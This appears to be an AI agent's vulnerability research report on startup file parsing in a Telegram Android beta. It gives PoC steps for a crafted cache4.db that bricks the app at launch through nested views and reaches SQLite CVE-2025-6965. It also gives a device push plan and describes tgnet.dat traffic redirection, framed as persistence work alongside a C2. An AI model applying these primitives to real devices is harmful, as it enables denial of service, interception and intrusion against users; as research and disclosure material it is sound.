# Startup app-data persistence: what the app parses at launch, and two DB-schema findings

Date: 2026-11-02
Target: `org.telegram.messenger.beta` 13.2.0 beta, versionCode **72799**, arm64,
Sony XQ-BT52, Android 13, UID 10357 (`u0_a357`).
Scope: **host/static only**; no phone, no emulator, no service restart. The device
test is specified but not executed here. The widget bundle / #1865 route is
explicitly out of scope for this note: the findings below are independent of it
and run from the app's startup file parsing.

Artifacts: `notes/poc/make_startup_db_poc.py`,
`notes/poc/startup_db_harness.c`, `notes/poc/sqlrun.c`,
`notes/poc/README_startup_db.md`. Host evidence is reproduced with the app's own
stock SQLite amalgamation.

---

## 0. TL;DR (honest)

1. **Correction to the premise:** 72799 does **not** link TDLib. `libtmessages.49.so`
   contains no `td_api`/`TdDb` symbols and only the app's own
   `org.telegram.SQLite` wrapper. The startup database is **`files/cache4.db`**,
   a plain SQLite 3.39.3 file (`jni/sqlite/sqlite3.c`, md5
   `4039d3d3d015d3092dda140c0bb27f7d`, byte-identical to the official 3.39.3
   amalgamation). There is no `td.binlog`/`db.sqlite` in this app.
2. **The startup DB trusts its schema.** `hs.java:2226-2241` opens the DB and,
   for an existing DB with `user_version == 181`, runs
   `SELECT seq, pts, date, qts, lsv, sg, pbytes FROM params WHERE id = 1`.
   `params` is created with `CREATE TABLE IF NOT EXISTS` **only** in the
   new-database branch, so a `VIEW params` in a crafted DB is compiled at
   startup. This is a **new delivery primitive**: arbitrary SQL is parsed by
   SQLite before any UI exists, with no widget, no message and no user action.
3. **New finding S1 (host-proven, no CVE):** a `params` view that references a
   chain of nested views makes `sqlite3ViewGetColumnNames()` recurse without a
   depth limit. 20,000 nested views (≈2.2 MB of schema SQL) overflow the native
   stack during the startup `SELECT`. The app crashes at **every launch** until
   the DB is removed; the file survives app kill and reboot. This is a launch
   DoS / app-bricking primitive, **not code execution**.
4. **Known-but-unapplied S2:** the same `params` view can carry >32,767
   distinct aggregate columns. `analyzeAggregate()` stores the aggregate index
   in an `i16` (`pExpr->iAgg = (i16)k`), and the `TK_AGG_COLUMN` code generator
   only asserts the index, so on the app's NDEBUG build it reads
   `AggInfo.aCol[-32768]` and uses the wild value as a VDBE register index.
   This is **CVE-2025-6965**, fixed in SQLite 3.50.2; 3.39.3 is affected.
   Host: a debug build asserts and a trace build prints 32,769 negative
   indices during the exact startup query. The consequence on the phone is a
   wild read/register index (potential memory corruption or crash); it was
   **not** verified on-device, and the host run did not crash because the
   wild read landed in mapped/zeroed heap.
5. **No new btree/page-parser bug found.** 300 structure-aware page mutations
   of a `cache4.db` seed produced only `SQLITE_CORRUPT`; the deliberate
   page-end cell overread is contained in the pager's page allocation. The
   in-range SQLite DB-file fixes I checked (3.41.2 STAT4, 3.45.1 mmap) are not
   reachable: STAT4 is off, `SQLITE_DEFAULT_MMAP_SIZE=0`, and the app never sets
   `PRAGMA mmap_size`.
6. **Language pack / theme / fonts / prefs:** the startup parsers are Java
   (`Xml.newPullParser` over `files/remote_<code>.xml`, the `.attheme` byte
   parser, and framework SharedPreferences XML) plus platform `BitmapFactory`
   for theme wallpapers. No app-native memory-safety sink was found; the
   residual issues are DoS (`String.format` width OOM) and an arbitrary-path
   read via the `langconfig` descriptor, not code execution.

**Verdict:** there is no startup **code-execution** path in the parsers examined
without a new high-severity parser bug. The new result is a reliable
**startup crash** (S1) from app data, independent of #1865; the memory-corruption
candidate is the **known, unpatched SQLite CVE-2025-6965** (S2), delivered by the
new startup `VIEW params` primitive. Ranked targets are in §7.

---

## 1. Exact startup reads from app data (72799)

The prior Frida spawn filter only logged `.so/.dex/.jar/.apk/.html/.js/.qbc/
.json/.xml/.attheme/.strings` paths, so `.db`/`.dat` opens were missed. The
table below is from static code plus the on-device 72799 logcat
(`telegramandroidwidget/evidence/evidence_20261101/logcat_survB.txt`) and the
pulled app data (`/tmp/opencode/armv7_lab/appdata/`).

| # | File(s) | Read when | Parser | App UID can write | Memory-safety sink |
|---|---------|-----------|--------|-------------------|--------------------|
| 1 | `files/cache4.db` (+`-wal`,`-shm`), `files/account1..3/cache4.db` | startup, before UI (`hs.java:2226`); logcat `current db version = 181` at 14:13:33.553 | **SQLite 3.39.3** (stock amalgamation, native C), schema + queries | yes | **S1/S2 below** |
| 2 | `files/file_to_path.db`, `file_to_path_backup.db` | ~1 s after start (logcat 14:13:34.7) | SQLite 3.39.3 | yes | same engine; its query text was not audited in detail, so a view-based primitive there is untested |
| 3 | `files/remote_<code>.xml` (`remote_it.xml`, 1,168,717 B on the phone) | startup, language init (`cd.java:1525` `G0`) | `Xml.newPullParser()` (framework; iterative XML, Java strings) | yes (and via the server pack) | none found; values later go to `String.format` (R2 OOM) |
| 4 | `files/*.attheme`, `files/<theme>_*.jpg` (chat/theme wallpapers) | startup/selected theme + chat-list background | Java byte parser `t6.T0` (`t6.java:3883`); wallpaper `BitmapFactory.decodeStream` (`t6.java:5237`, `o6.java:125`) | yes | none in the Java parser; image bytes reach **platform** BitmapFactory |
| 5 | `shared_prefs/*.xml` (`mainconfig.xml`, `langconfig.xml`, ...) | startup | Android `SharedPreferencesImpl` / framework XML | yes | none in the framework parser; values select paths (see §5.3) |
| 6 | `files/tgnet.dat`, `files/dc<id>conf.dat`, `files/accountN/tgnet.dat` | startup, network init (logcat 14:13:33.661) | **tgnet native C** (`Config.cpp`, `Datacenter.cpp`) | yes | not a code path; DoS + short-auth-key OOB read + DC redirection (see §6) |
| 7 | Firebase `PersistedInstallation*.json`, `files/.com.google.firebase...json` | startup | Firebase SDK / `JSONObject` (Java) | yes | none found |
| 8 | `files/widget-sandbox/<hash>/sandbox-bundle.js` | **only on widget render** | QuickJS + #1865 | yes | out of scope by instruction |

Notes:
- The app opens the **account0** DB at `files/cache4.db` and the per-account DBs
  at `files/accountN/cache4.db`; the logcat shows `current db version = 181`
  for each account. The DB open happens on a background thread (`30588` in the
  14:13:33 trace), before tgnet and before any UI.
- `cache4.db` is opened with `sqlite3_open` (read-write-create) via
  `SqliteWrapper.cpp:Java_org_telegram_SQLite_SQLiteDatabase_opendb`; the app
  then runs four PRAGMAs and the `params` SELECT. The schema is read from
  `sqlite_master`; the app never validates it.
- The app's `load_extension` is not enabled at runtime: `SqliteWrapper.cpp` never
  calls `sqlite3_enable_load_extension`, and the SQL function is not registered.
  `SQLITE_OMIT_LOAD_EXTENSION` is not defined for Android, but the C API is
  unreachable from the DB's SQL.

Why the `params` name matters: for an **existing** DB (`exists == true`) with
`user_version == 181`, `hs.java` does not run `CREATE TABLE IF NOT EXISTS
params(...)`; it goes straight to the SELECT. A `VIEW params` therefore supplies
the SQL that SQLite compiles at startup. This is the delivery primitive for both
findings. (`user_version == 0` is rejected as malformed; any value `< 181` runs
the migration `P1`, so the PoC sets exactly 181.)

---

## 2. S1 — new: unbounded nested-view recursion at startup (launch crash)

### 2.1 The bug

`sqlite3ViewGetColumnNames()` (amalgamation line 118226 in 3.39.3) resolves a
view by preparing its SELECT with `sqlite3ResultSetOfSelect()`. A view that
selects from another view enters `sqlite3ViewGetColumnNames()` again through
`selectExpander()` → `sqlite3SelectPrep()`. There is **no depth counter** and no
`SQLITE_MAX_VIEW_DEPTH`-style limit. The recursion is bounded only by the native
thread stack. The same code exists in current SQLite (checked 3.50.2): no view
depth limit was added.

### 2.2 PoC

```sh
python3 notes/poc/make_startup_db_poc.py --mode viewchain \
    --out poc_viewchain.db --base /path/to/real/cache4.db --depth 20000
```

The generator copies a real `cache4.db`, drops the real `params` table, creates
`zz_poc_base`, 20,000 views `zz_poc_v0 … zz_poc_v19999` (each `SELECT x FROM`
the next), and `CREATE VIEW params AS SELECT 1 AS id, x AS seq, 0 AS pts, …
FROM zz_poc_v0`, then sets `PRAGMA user_version=181` and removes
`cache4.db-wal/-shm`.

### 2.3 Host reproduction (done)

Build the harness from `notes/poc/startup_db_harness.c` against the app's stock
`sqlite3.c` (see the comment at the top of the file) and run:

```
$ ./startup_db_harness poc_viewchain.db startup
AddressSanitizer:DEADLYSIGNAL
==...==ERROR: AddressSanitizer: stack-overflow ...
    #8  sqlite3SelectDup        sqlite3.c:105372
    #9  sqlite3ViewGetColumnNames sqlite3.c:118284
    #10 selectExpander         sqlite3.c:141391
    #11 sqlite3WalkSelect      sqlite3.c:101458
    #12 sqlite3SelectExpand    sqlite3.c:141698
    #13 sqlite3SelectPrep      sqlite3.c:141784
    #14 sqlite3ResultSetOfSelect sqlite3.c:137928
    #15 sqlite3ViewGetColumnNames sqlite3.c:118296
    ... (repeats) ... 
```

The same crash occurs on a copy of the **real** `files/cache4.db` (6.4 MB,
`user_version=181`, all 239 schema objects kept), so the surrounding app schema
does not change the result. No WAL is needed.

### 2.4 Impact and limits

- The crash is a SIGSEGV on the guard page, not a caught SQL error; the app's
  `catch (Exception)` around the DB open does not catch it.
- The DB file is app data, so the crash repeats on every launch and survives
  `am force-stop`, a recents kill and a reboot. It is a persistent **launch
  DoS / app bricking** primitive. Recovery requires clearing Telegram data (or
  restoring the DB) — the user cannot reach the UI to do it from inside the app.
- Depth on the phone: the DB open runs on a background Java thread (logcat
  thread `30588`), typically a 1 MB stack. 20,000 frames should overflow a
  1 MB stack; if this app's thread has a larger stack, raise the depth to
  50,000/100,000 (≈5–11 MB of schema SQL). Measure 500/1,000/2,000/4,000/
  8,000/20,000 in the device sweep (§8.1) to find the threshold.
- **Not code execution.** It is a stack-exhaustion crash; the stack guard page
  is hit by an ordinary frame write. I did not find a stack-clash primitive.
- **Novelty:** no CVE found for this; the SQLite limits documentation covers
  expression depth, not view depth; the 3.50.2 source still has no view-depth
  counter. It is a design/robustness bug in SQLite exposed by an app that trusts
  a writable DB. I did not find a prior report of it in the Telegram/Android
  context.

---

## 3. S2 — known but unapplied: CVE-2025-6965 through the startup `params` view

### 3.1 The bug

In SQLite 3.39.3 `analyzeAggregate()` stores the aggregate/column index in a
signed 16-bit field:

```c
pExpr->iAgg = (i16)k;     /* TK_AGG_COLUMN, addAggInfoColumn() index */
pExpr->iAgg = (i16)i;     /* TK_AGG_FUNCTION, addAggInfoFunc() index */
```

and the `TK_AGG_COLUMN` code generator (`sqlite3ExprCodeTarget`, amalgamation
line 107722) has only an assert before the array access:

```c
assert( pExpr->iAgg>=0 && pExpr->iAgg<pAggInfo->nColumn );
pCol = &pAggInfo->aCol[pExpr->iAgg];
```

On a release build (the app's libtmessages contains no SQLite assert strings →
`NDEBUG`), the assert is gone. With more than 32,767 distinct aggregate columns,
`iAgg` wraps negative and `aCol[-32768…-1]` is read; the resulting `iMem` is
used as a VDBE register index. The fix (SQLite check-in `5508b56fd2`,
2025-06-27, first released in 3.50.2) rejects a query with more than
`SQLITE_LIMIT_COLUMN` (2,000) aggregate terms:

```
sqlite3ErrorMsg(pParse, "more than %d aggregate terms", mxTerm);
```

NVD **CVE-2025-6965**: “the number of aggregate terms could exceed the number of
columns available … could lead to a memory corruption issue.”

### 3.2 Why the app is affected

- The app's SQLite is exactly 3.39.3 and is compiled without the fix.
- The startup `SELECT … FROM params` compiles a `VIEW params`; a view may
  contain an aggregate query. The outer SELECT result has 8 columns, so the
  `SQLITE_MAX_COLUMN` result-set check does not fire; the aggregate terms live
  inside one result expression.
- The expression depth limit (1,000) does not fire because the PoC uses a flat
  `CASE` list: 259 `WHEN (random()&1) THEN count(max(127 columns))` branches,
  each `max(...)` argument list is flat (≤127 args, `SQLITE_MAX_FUNCTION_ARG`).
  The 259 aggregate calls reference 32,893 distinct `(table-alias, column)`
  pairs, so `aCol` has 32,893 entries and the 32,769th gets `iAgg = -32768`.
- GROUP BY / ORDER BY are not used: both are capped at `SQLITE_LIMIT_COLUMN`
  (2,000) by `sqlite3ResolveOrderGroupBy()`, which is why this uses aggregate
  function arguments instead.

### 3.3 Host reproduction (done)

`notes/poc/make_startup_db_poc.py --mode agg --groups 259 --row` on a real
`cache4.db` copy builds `poc_agg.db`; `notes/poc/README_startup_db.md` has the
exact build/run commands. Two independent checks (both on the app's exact
startup statement):

```
# debug build (asserts on), same 3.39.3 source, exact startup query:
$ ./sqlrun_dbg poc_agg.db query.sql
sqlite3.c:107722: sqlite3ExprCodeTarget: Assertion
  `pExpr->iAgg>=0 && pExpr->iAgg<pAggInfo->nColumn' failed.

# release build + a one-line trace in the same place, exact startup query:
$ ./sqlrun_trace poc_agg.db query.sql
TRACE OOB AGG_COL iAgg=-32768 nColumn=32893 nFunc=259
TRACE OOB AGG_COL iAgg=-32767 nColumn=32893 nFunc=259
...
TRACE OOB AGG_COL iAgg=-1     nColumn=32893 nFunc=259
(32769 lines)
```

(`query.sql` is `SELECT seq, pts, date, qts, lsv, sg, pbytes FROM params WHERE
id = 1;`.)

The query is the app's exact
`SELECT seq, pts, date, qts, lsv, sg, pbytes FROM params WHERE id = 1`.
An ASan build of the same startup harness did **not** crash: the 1 MB-out-of-
bounds read landed in mapped/zeroed heap, and the bogus register values did not
fault. So the host proves the **invalid index and wild read**, not a reliable
crash. On the phone the heap layout is different (scudo, 1 MB frame offset);
the read may hit a guard/unmapped page or return a value that is used as a
register index. That is the device test in §8.

### 3.4 Impact / honesty

- This is a **known** CVE, not a new bug. What is new here is the **startup
  delivery**: the app compiles a `VIEW params` from `cache4.db` at launch, so
  the CVE is reached without a widget, message or user action, and the DB
  survives reboot.
- If the wild `iMem` is a large/negative register number, the VDBE will access
  `aMem[iMem]` out of bounds on the first accumulator row. On a release build
  that is a memory-corruption primitive (read/write depending on the opcode);
  on the host the value happened to be benign. It is **not** proven RCE.
- The fix is out (3.50.2); the app should upgrade the amalgamation (or at least
  apply `5508b56fd2`). The same applies to `file_to_path.db` because it uses the
  same engine.

---

## 4. S1/S2 delivery details and the exact startup sequence

`hs.java` (72799, `jadx_out/sources/org/telegram/messenger/hs.java`):

```java
2219  this.f15942c = new File(h, "cache4.db");
2220  this.d = new File(h, "cache4.db-wal");
2221  this.e = new File(h, "cache4.db-shm");
2223  boolean exists = this.f15942c.exists();
2226  SQLiteDatabase sQLiteDatabase = new SQLiteDatabase(this.f15942c.getPath());
2228  sQLiteDatabase.executeFast("PRAGMA secure_delete = ON")...
2229  ... "PRAGMA temp_store = MEMORY"
2230  ... "PRAGMA journal_mode = WAL"
2231  ... "PRAGMA journal_size_limit = 10485760"
2233  int intValue = ... "PRAGMA user_version"
2237  if (intValue == 0) throw new Exception("malformed");
2241  queryFinalized("SELECT seq, pts, date, qts, lsv, sg, pbytes FROM params WHERE id = 1")
2272  if (intValue < 181) { P1(intValue); }     // migrations
2260  catch (Exception e7) { ... "malformed" -> rename/recreate ... }
```

`SQLiteDatabase.queryFinalized` → `SQLitePreparedStatement.prepare` →
`sqlite3_prepare_v2` (`SqliteWrapper.cpp`), so the view is compiled at the
`queryFinalized` call on the background DB thread. Both PoCs set
`user_version=181`, remove `-wal/-shm`, and keep a real app schema so the app
does not take the "new database" path.

**PoC file creation** (`make_startup_db_poc.py`) works on a copy of the real
`cache4.db`: it drops the real `params` table (the app only uses the view),
creates the PoC objects with a `zz_poc_` prefix, sets `user_version=181`, and
deletes stale WAL/SHM. For S1 the DB grows by ≈2.2 MB (20k views); for S2 by
≈0.3 MB (259 aggregates + 2,000-column table).

---

## 5. Language pack, theme, fonts, prefs — audit result

### 5.1 Language pack (`files/remote_it.xml`)

- Startup load: `cd.java:1525` `G0(File, boolean)` (method shown in jadx),
  called from the language init; the file is `zc.e()` → `new File(filesDir,
  "remote_" + lang_code + ".xml")` (`zc.java:95`). On the phone it is 1.17 MB.
- Parser: `Xml.newPullParser()`; the loop reads `getName()`,
  `getAttributeValue(0)`, `getText()`, trims, replaces `\\n`/`&lt;`, and puts
  `String` keys/values in a `HashMap(10000)`. All lengths are JVM-managed; no
  native buffer or length arithmetic. A malformed file is copied to
  `files/malformed_locales/<getName()>` and the map reload is flagged.
- Sinks: the values are later used as format strings in
  `formatString()` (`String.format(currentLocale, value, args)`, inside
  `try/catch (Exception)`). A width such as `%1000000000s` can allocate
  gigabytes and throws `OutOfMemoryError` (an `Error`, not caught) — the old
  R2 hypothesis. This is a **DoS**, not memory corruption. The file name is
  fixed by the language code; the descriptor's `d` field (`langconfig.xml`,
  `zc.e()`) can be an arbitrary path, so the app can be made to parse an
  arbitrary readable file as XML at startup (and copy it to
  `malformed_locales/` on error): an arbitrary-path read within the app UID's
  permissions, not code execution.
- No new memory-safety bug found. The XML parser is iterative; entity expansion
  is a framework matter and does not reach an app-native sink.

### 5.2 Theme (`.attheme` / wallpaper)

- `t6.T0(File, String, String[])` (`t6.java:3883`) parses 1,024-byte chunks,
  splits on `\n`, handles `WLS=` (wallpaper link) and `WPS` (embedded image
  offset), and stores color keys in a `SparseIntArray` (Java). The `WPS` offset
  is `currentPosition + len` from the actual byte position, never an
  attacker-supplied number; a past-EOF offset yields a decode failure, not a
  read of another file.
- The wallpaper is decoded by `BitmapFactory.decodeStream` with
  `inJustDecodeBounds` then a sampled decode (`t6.java:5237` `n1`,
  `o6.java:125`). That is the **platform** decoder (libjpeg-turbo/libwebp/Skia),
  not libtmessages. The chat list draws the theme background at startup, so a
  replaced `files/<theme>_*.jpg` is decoded at launch — the same class as the
  cached-avatar BitmapFactory path already reported, device-patch dependent.
- No app-native theme parser bug found.

### 5.3 Fonts and prefs

- The app only uses `Typeface.createFromAsset` (APK assets) in the font path I
  checked; there is no app-data font file read at startup, so no FreeType
  parsing of attacker bytes.
- SharedPreferences XML is parsed by the framework. Values that name files
  (`langconfig` descriptor `d`, theme names, paths) let an attacker redirect
  reads, but not load code. The theme name is sanitized by `fixFileName`
  (`/`, `\`, `:` removed; `.attheme` forced), so no traversal write.

---

## 6. btree/page parser and the other startup native configs

### 6.1 SQLite btree/page parser (the requested target)

- The app's `sqlite3.c` is byte-identical to the official 3.39.3 amalgamation
  (`md5 4039d3d3d015d3092dda140c0bb27f7d`). No Telegram patches in the btree.
- DB-file parsing at startup: page 1 (header + `sqlite_master` btree), the
  `params` root page (or view), and any overflow pages. `btreeInitPage()` checks
  `nCell` and the free-space chain; `findCell()` masks the cell pointer with
  `pageSize-1`, so a pointer is always inside the page. `btreeCellSizeCheck()` /
  `PRAGMA cell_size_check` is **off** by default, so cell sizes are not
  validated; the parser relies on the page buffer being page-sized.
- A deliberate cell at `pageSize-4` with a continuation-varint payload length
  (`80 80 80 80`) makes `btreeParseCellPtr` read up to ~8 bytes past
  `usableSize`; on the host this returned `SQLITE_CORRUPT` and did **not** trip
  ASan because the pager's page allocation contains the extra `PgHdr`/`MemPage`
  storage after the page data. It is the acknowledged "corrupt database may
  overread a few bytes within the page buffer" case, not a write primitive.
- 300 structure-aware mutations (1–4 byte flips in page 1 and the `params` root
  page, plus cell-pointer/header variants) produced only `SQLITE_CORRUPT`; no
  ASan report. This is a small sample, not a proof of absence; the btree parser
  remains the largest **new-bug** surface (see §7).
- In-range known DB-file fixes checked:
  - **3.41.2** “reads past the end … corrupt database file using
    `SQLITE_ENABLE_STAT4`” — STAT4 is not enabled (`strings`/compile options).
  - **3.45.1** “read of a few bytes past a memory-mapped segment … craftily
    corrupted database using memory-mapped database” — `SQLITE_DEFAULT_MMAP_SIZE
    = 0` and the app never issues `PRAGMA mmap_size`; not reachable.
  - **3.50.2** CVE-2025-6965 (S2) — reachable; **3.39.3 is affected**.
  - **3.43.2** CVE-2024-0232 — the vulnerable `jsonParseAddNodeArray` code is
    **not present** in 3.39.3 (the prior note listed it as in-range; corrected
    here). JSON1 is compiled, but this specific UAF is not applicable.
  - **3.42.0** CVE-2025-7458 (KeyInfo integer overflow) needs a huge ORDER BY
    expression list; `sqlite3ResolveOrderGroupBy()` caps ORDER BY/GROUP BY at
    `SQLITE_LIMIT_COLUMN` (2,000), so it is not reachable from a view.
- The app never sets `PRAGMA defensive` or `writable_schema`; `load_extension`
  is not enabled.

### 6.2 tgnet config (`tgnet.dat` / `dc*conf.dat`) — another startup native parser

Not the main target, but it is read at startup (`Config(…, files/tgnet.dat)
load, size = 5716, fileSize = 5720` at 14:13:33.661) and is app-writable:
- `Config::readConfig()` takes a `uint32 size` and checks only
  `(int32_t)size < fileSize`; a size with the high bit set allocates up to 4 GB
  (`NativeByteBuffer`/`allocateDirect`) and `exit(1)` on failure — a startup
  DoS.
- `Datacenter` reads up to 4 address arrays, a short/long `authKeyPerm`, and
  salt vectors; a short auth key is later used as a 256-byte key in
  `generateMessageKey()`/`aesIgeEncryption()` → up to ~128 bytes OOB **read** of
  heap key material. No write primitive found.
- More interesting for persistence: `tgnet.dat` is unauthenticated and carries
  the DC address + auth key. A crafted entry makes the app connect to an
  attacker-chosen `ip:port` at startup (before login) and encrypt with a key
  the attacker knows; the app rewrites the file with the parsed values. This is
  a persistent **traffic-redirection / server-impersonation** primitive, not
  code execution; it could deliver content to the client at every start, but
  the client still needs a UI path (widget render, media view) to turn content
  into code. Recorded as a ranked secondary target, not a PoC here.

---

## 7. Ranking of remaining research targets

| Rank | Target | Why | Current status |
|---|---|---|---|
| 1 | **SQLite btree/page parser, crafted DB file at startup** | Native, pre-UI, fully attacker-controlled bytes; 3.39.3 is old; 300 mutations negative; the view-schema route is already proven | No new bug yet; needs a coverage-guided fuzzer on `sqlite3_prepare`/`sqlite3_step` with a `cache4.db` corpus; `-j1`, nice |
| 2 | **CVE-2025-6965 (S2) on-device** | Known memory-corruption, unapplied, new startup delivery; whether the wild `iMem` faults/corrupts depends on the Android heap | Host index proven; device test in §8 |
| 3 | **SQLite view-schema recursion (S1)** | New, reliable launch crash; no CVE; not code execution | Host-proven; device test in §8 |
| 4 | **SQLite WAL recovery** (`cache4.db-wal`) | App opens WAL at startup; frames have checksums but the recovery paths are less exercised; crafted WAL can inject pages / hit parser bugs | Not tested; same SQLite engine |
| 5 | **Language pack `String.format` OOM** | Startup read of a 1.17 MB XML; OOM is an `Error`, not caught | Hypothesis (R2), DoS only |
| 6 | **Theme wallpaper / avatar BitmapFactory** | Startup chat-list decode of app-data image | Platform decoder, device-patch dependent; not libtmessages |
| 7 | **tgnet.config redirection** | Persistent DC MITM at every start | Design/robustness, no code exec |

The widget bundle / #1865 is deliberately **not** in this ranking; it requires a
render and was excluded by the task.

---

## 8. Device test plan (Sony only; not executed here)

Preconditions: another agent owns the C2; **do not reboot the phone**, do not
touch the widget payload, keep the real `cache4.db` backup off-device. The app
is `org.telegram.messenger.beta`, UID 10357. `am force-stop` and a normal
(cold) start are allowed; a reboot is not.

### 8.1 S1 (view-chain) — expected launch crash

1. Backup: `cp files/cache4.db files/cache4.db.bak.<ts>` and pull it; note md5.
   Also back up `files/account1..3/cache4.db` if present.
2. Build the PoC from the pulled real DB on the host:
   `python3 make_startup_db_poc.py --mode viewchain --base cache4.db --out
   poc_vc.db --depth 20000`.
3. `am force-stop org.telegram.messenger.beta`; push `poc_vc.db` to
   `files/cache4.db` (chown 10357, chmod 600); delete `cache4.db-wal`/`-shm`.
4. `adb logcat -c`; start the app; capture logcat and
   `/data/tombstones` (or `adb shell dumpsys dropbox --print`). Expect a
   SIGSEGV/SIGABRT in `sqlite3ViewGetColumnNames`/`sqlite3SelectDup` on a
   background DB thread, before the chat list. The app must not reach the UI.
5. Repeat the start once to confirm it is deterministic (the DB persists). Then
   restore the backup, remove `-wal`/`-shm`, start, and confirm the chat list.
6. Threshold sweep (optional): 500/1,000/2,000/4,000/8,000/20,000 views,
   then 50,000/100,000 if nothing crashes; record the smallest depth that
   crashes on this device (this gives the app thread stack margin). Stop at
   the first crash; restore after each.

Abort: any data loss beyond the replaced DB, or a crash in a path other than
SQLite; restore immediately.

### 8.2 S2 (CVE-2025-6965) — memory-corruption candidate

1. Build `--mode agg --groups 259 --row` on the real DB backup.
2. Replace as in S1 (same backup/restore), start, observe:
   - app survives and shows the chat list: record that the wild read was benign
     on this heap; try 520 groups / 66,000 columns (`--groups 520 --aliases 33
     --cols 2000`) and a second start, then stop;
   - app crashes with a tombstone in `sqlite3ExprCodeTarget`/`sqlite3VdbeExec`:
     save the tombstone, the exact DB md5 and the logcat; that is the
     memory-corruption proof for the note;
   - app logs `malformed` and recreates the DB: record it; the view was rejected
     (the catch path), no finding.
3. Do not attempt heap grooming on the phone in this pass; a crash/regression
   is enough to establish reachability.

### 8.3 Control tests (same session, after restore)

- Replace `remote_it.xml` with a truncated/invalid XML: the app should log
  `getLocaleFileStrings: error` and continue (proves the startup read path).
- Replace the selected `.attheme` with a malformed key/value file: the app
  should keep the built-in theme.
- Do **not** modify `tgnet.dat` in this pass; it can redirect traffic and is
  not needed for S1/S2.

Cleanup: restore `cache4.db`, `remote_it.xml`, `.attheme`, remove all
`zz_poc_*` objects (or restore the DB backup), verify the app starts and the
chat list is usable, and record the final md5.

---

## 9. What is proven vs untested, and novelty

**Proven on the host (static + local execution):**
- 72799 has no TDLib; the startup DB is `cache4.db` + stock SQLite 3.39.3.
- The app's startup SQL is `SELECT … FROM params WHERE id = 1` on an existing
  DB with `user_version=181`; a `VIEW params` is compiled at launch.
- S1: 20,000 nested views cause an ASan stack overflow in
  `sqlite3ViewGetColumnNames` on a real `cache4.db` copy; no depth limit in
  3.39.3 or 3.50.2. This is a **new** launch-DoS finding (no CVE found).
- S2: 32,893 aggregate columns make `iAgg=-32768`; a debug build asserts and a
  release trace prints 32,769 negative indices during the exact startup query.
  The app's 3.39.3 is affected by **CVE-2025-6965** (fixed 3.50.2).
- Btree/page parser: the deliberate cell overread stays inside the pager
  allocation; 300 mutations gave only `SQLITE_CORRUPT`; the known 3.41.2/3.45.1
  fixes are not reachable (STAT4 off, mmap off); CVE-2024-0232 is not present in
  3.39.3; CVE-2025-7458 is blocked by the 2,000-term ORDER BY cap.
- Language pack/theme/fonts/prefs: parsers are Java/framework; no app-native
  memory-safety sink found.

**Untested (device):**
- Whether S1 crashes on the phone at 20,000 (certain enough) and the exact
  threshold on the app's background thread stack.
- Whether S2’s wild `iMem` faults or corrupts on the Android heap; the host
  did not crash. No RCE is claimed.
- The language-pack OOM and the theme wallpaper platform decoder.

**Novelty summary:** S1 is a new bug type (startup native stack exhaustion via
DB schema), independent of #1865, but it is a crash, not code execution. S2 is a
known CVE, newly delivered at startup via the `VIEW params` primitive; it is the
only memory-corruption candidate found. The btree/page parser (the requested
"new bug" target) produced no new finding in this pass.

**Bottom line:** I did **not** find a startup code-execution path in the app's
own parsers. If the goal is code execution, the ranked target is a new
btree/page or WAL bug in SQLite 3.39.3 (§7 rank 1/4); if a reliable persistent
launch impact is acceptable, S1 is already a working PoC, and S2 is the
memory-corruption candidate that must be tested on the phone.

---

## 10. References

- `hs.java:2219-2263` — DB paths, open, PRAGMAs, `user_version`, `params`
  SELECT, malformed fallback (jadx 72799).
- `SqliteWrapper.cpp` — `opendb`/`prepare` (`sqlite3_open`, `sqlite3_prepare_v2`).
- `Android/TMessagesProj/jni/sqlite/sqlite3.c` — 3.39.3, md5
  `4039d3d3d015d3092dda140c0bb27f7d` (official amalgamation).
- SQLite 3.39.3 amalgamation, `sqlite3ViewGetColumnNames` (line 118226),
  `analyzeAggregate` (109896/109942), `sqlite3ExprCodeTarget` (107722),
  `sqlite3ResolveOrderGroupBy` (103070).
- SQLite check-in `5508b56fd2` / NVD CVE-2025-6965; release notes 3.41.2,
  3.45.1, 3.50.2.
- `telegramandroidwidget/evidence/evidence_20261101/logcat_survB.txt` —
  `current db version = 181` (13715), tgnet config loads (13741-13776),
  account DBs (<CHAT_ID>+).
- `/tmp/opencode/armv7_lab/appdata/files/cache4.db` — real 72799 DB used for
  the host PoC (6,447,104 B, `user_version=181`).
- `notes/poc/make_startup_db_poc.py`, `notes/poc/startup_db_harness.c`,
  `notes/poc/sqlrun.c`, `notes/poc/README_startup_db.md` — PoC generator, host
  harness, SQL runner and build/run instructions.
- Prior notes: `POC/theme_lang_audit/REPORT.md` (language/theme audit, R2),
  `telegramandroidwidget/notes/db_native_parsers.md` (SQLite survey; its
  CVE-2024-0232 range claim is corrected here), `POC/sqlite_cve/README.md`
  (CVE-2022-35737, not reachable).
